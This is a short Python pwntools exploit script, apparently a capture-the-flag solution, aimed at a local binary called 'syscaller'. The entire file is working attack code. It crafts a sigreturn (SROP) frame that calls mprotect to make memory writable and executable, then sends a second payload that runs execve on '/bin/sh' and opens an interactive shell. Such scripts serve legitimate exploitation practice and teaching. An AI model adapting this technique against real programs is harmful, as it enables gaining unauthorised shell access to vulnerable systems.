from pwn import *
import time

target = process('./syscaller')

context.clear(arch = 'amd64')
#context.log_level = 'debug'

frame = SigreturnFrame()

# set up registers so that we can sigreturn
R12 = p64(0x0)
R11 = p64(0x0)
Rdi = p64(0x0)
Rax = p64(0xf)
Rbx = p64(0x0)
Rdx = p64(0x0)
Rsi = p64(0x0)

# set up sigreturn frame so that we can call mprotect to make an area of memory writable and executable
frame.rsi = 0x400130
frame.rip = 0x400104
frame.rsp = 0x400130
frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7

payload = b""

# set up payload
payload += R12 + R11 + Rdi + Rax + Rbx + Rdx + Rsi + Rdi + bytes(frame)

target.sendline(payload)

# our sigreturn had us redo some instructions so we can set up the registers again
#we store address in rdi which is the binsh_addr variable
#these are stored at 0x400130
rax_exec = p64(0x3b)
binsh_addr = p64(0x400170)
r12_exec = p64(0x0)
r11_exec = p64(0x0)
rbx_exec = p64(0x0)
rdx_exec = p64(0x0)
rsi_exec = p64(0x0)

binsh = b"/bin/sh\x00"

#send payload that lets us pop the shell
payload = r12_exec + r11_exec + binsh_addr + rax_exec + rbx_exec + rdx_exec + rsi_exec + binsh_addr + binsh
#gdb.attach(target, gdbscript = 'b *(0x400113)')
target.sendline(payload)

target.interactive()
